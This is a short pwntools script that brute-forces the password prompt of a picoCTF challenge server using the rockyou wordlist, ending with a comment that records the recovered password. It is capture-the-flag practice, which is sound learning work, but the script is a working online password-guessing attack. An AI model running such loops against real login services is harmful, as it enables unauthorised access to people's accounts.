from pwn import *

wordlist = "/usr/share/wordlists/rockyou.txt"
context.log_level = 'debug'

try:
    with open(wordlist, encoding="latin-1") as file:
        for line in file:
            if line.isprintable:
                password = line.strip()

                io = remote("tethys.picoctf.net", 62112)
                io.recvuntil("password?")
                io.sendline(password)
                io.recvline()
                r = io.recvline()
                
                if b'Lol, good try' not in r:
                    print([password])
                    break
            else:
                pass
except Exception as e:
    print(e)

#pass="My_Passw@rd_@1234"
